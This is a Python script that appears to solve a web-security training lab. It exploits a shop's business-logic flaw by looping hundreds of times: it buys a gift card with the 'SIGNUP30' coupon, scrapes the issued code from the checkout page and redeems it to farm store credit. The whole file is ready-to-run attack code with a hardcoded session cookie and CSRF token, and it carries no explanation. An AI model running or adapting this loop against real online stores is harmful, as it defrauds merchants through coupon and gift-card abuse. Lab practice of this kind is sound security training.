import re
from tqdm import tqdm
import requests

url_base = 'https://acb81fed1f7a4ea9c0302be400a80034.web-security-academy.net'
cookies = dict(session='RcKBk6eUtys5ggeW6lPEcHm8z2XzkASO')
csrf_token = '44kH6wNaDrzhLQp7kZQT1bUVKZNRGQaG'

coupon_url = f"{url_base}/cart/coupon"
gift_card_url = f"{url_base}/gift-card"
checkout_url = f"{url_base}/cart/checkout"
cart_url = f"{url_base}/cart"

coupon_code = 'SIGNUP30'

for i in tqdm(range(int(1237 // 3 + 1))):
    # Add to cart
    data = {'productId': 2, 'redir': 'PRODUCT', 'quantity': 1}
    requests.post(url=cart_url, data=data, cookies=cookies)

    # Apply coupon code
    data = {'csrf': csrf_token, 'coupon': coupon_code}
    requests.post(url=coupon_url, data=data, cookies=cookies)

    # Checkout
    data = {'csrf': csrf_token}
    resp = requests.post(url=checkout_url, data=data, cookies=cookies, allow_redirects=True)

    if m := re.search(r"<table class=is-table-numbers.*<td>([A-Za-z0-9]+)</td>", resp.text.replace('\n', '')):
        code = m.group(1)

    # Use gift card
    data = {'csrf': csrf_token, 'gift-card': code}
    requests.post(url=gift_card_url, data=data, cookies=cookies)
